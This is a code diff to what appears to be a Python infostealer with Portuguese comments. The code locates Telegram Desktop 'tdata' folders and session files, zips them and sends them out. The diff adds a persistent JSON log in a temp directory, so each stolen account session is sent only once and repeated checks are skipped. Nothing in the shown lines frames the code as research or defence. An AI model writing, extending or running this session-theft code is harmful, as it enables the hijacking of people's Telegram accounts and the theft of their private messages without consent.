@@ -5430,6 +5430,70 @@ def send_session_files(tdata_path, telegram_dir=None):
 encontradas = []
 conjuntos_processados = set()  # Para evitar processar o mesmo conjunto duas vezes
 
+# Sistema persistente para evitar envios duplicados
+arquivos_enviados_file = os.path.join(temp, 'telegram_enviados.json')
+
+def carregar_arquivos_enviados():
+    """Carrega lista de arquivos já enviados (persistente)."""
+    if os.path.exists(arquivos_enviados_file):
+        try:
+            with open(arquivos_enviados_file, 'r', encoding='utf-8') as f:
+                return json.load(f)
+        except:
+            return {}
+    return {}
+
+def salvar_arquivo_enviado(identificador, tdata_path=None, session_path=None):
+    """Salva identificador de arquivo já enviado (persistente)."""
+    try:
+        enviados = carregar_arquivos_enviados()
+        enviados[identificador] = {
+            'tdata_path': tdata_path,
+            'session_path': session_path,
+            'timestamp': time.time(),
+            'data_hora': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
+        }
+        
+        # Garante que o diretório existe
+        os.makedirs(os.path.dirname(arquivos_enviados_file), exist_ok=True)
+        
+        # Salva com múltiplas tentativas
+        for tentativa in range(3):
+            try:
+                with open(arquivos_enviados_file, 'w', encoding='utf-8') as f:
+                    json.dump(enviados, f, indent=2, ensure_ascii=False)
+                
+                # Verifica se foi salvo corretamente
+                if os.path.exists(arquivos_enviados_file):
+                    tamanho = os.path.getsize(arquivos_enviados_file)
+                    if tamanho > 0:
+                        print(f"***OK Informações salvas em {arquivos_enviados_file} ({tamanho} bytes)")
+                        return True
+                
+                if tentativa < 2:
+                    time.sleep(0.1)
+                    continue
+            except Exception as e:
+                print(f"***ERRO ao salvar arquivo enviado (tentativa {tentativa + 1}): {repr(e)}")
+                if tentativa < 2:
+                    time.sleep(0.1)
+                    continue
+                else:
+                    print(f"***ERRO CRÍTICO: Não foi possível salvar informações do arquivo enviado!")
+                    return False
+        
+        return False
+    except Exception as e:
+        print(f"***ERRO CRÍTICO ao salvar arquivo enviado: {repr(e)}")
+        import traceback
+        traceback.print_exc()
+        return False
+
+def ja_foi_enviado(identificador):
+    """Verifica se um arquivo já foi enviado."""
+    enviados = carregar_arquivos_enviados()
+    return identificador in enviados
+
 def obter_identificador_unico(tdata_path=None, session_path=None, numero_conta=None):
     """Gera identificador único para um conjunto/sessão."""
     # Prioriza número da conta (mais confiável)
@@ -5489,6 +5553,11 @@ def processar_conjunto_imediato(tdata_path):
     # Gera identificador único (prioriza número da conta)
     identificador = obter_identificador_unico(tdata_path=tdata_path, numero_conta=numero_conta)
     
+    # Verifica se já foi enviado (persistente)
+    if identificador and ja_foi_enviado(identificador):
+        print(f"***AVISO: Conjunto já foi enviado anteriormente (ignorando): {tdata_path}")
+        return False
+    
     conjunto_id = (telegram_dir, tdata_path)
     if conjunto_id not in conjuntos_processados:
         conjuntos_processados.add(conjunto_id)
@@ -5513,6 +5582,14 @@ def processar_conjunto_imediato(tdata_path):
             traceback.print_exc()
             resultado = False
         
+        # Se enviou com sucesso, marca como enviado
+        if resultado and identificador:
+            try:
+                salvar_arquivo_enviado(identificador, tdata_path=tdata_path)
+                print(f"***Conjunto marcado como enviado: {identificador}")
+            except Exception as e:
+                print(f"***ERRO ao salvar arquivo enviado: {repr(e)}")
+        
         # Delay após processar (evita sobrecarga)
         time.sleep(2)
         
@@ -5533,6 +5610,11 @@ def processar_session_isolado(session_path):
     
     # Gera identificador único (prioriza número da conta)
     identificador = obter_identificador_unico(session_path=session_path, numero_conta=numero_conta)
+    
+    # Verifica se já foi enviado (persistente)
+    if identificador and ja_foi_enviado(identificador):
+        print(f"***AVISO: Session já foi enviada anteriormente (ignorando): {session_path}")
+        return False
     
     conjunto_id = f"session_isolado_{session_path}"
     if conjunto_id not in conjuntos_processados:
@@ -5914,6 +5996,11 @@ def processar_session_isolado(session_path):
             
             # Limpa arquivo temporário
             remover_arquivo_temp(zip_path)
+            
+            # Marca como enviado (persistente)
+            if identificador:
+                salvar_arquivo_enviado(identificador, session_path=session_path)
+                print(f"***Session isolada marcada como enviada: {identificador}")
             
             return True
         except Exception as e:
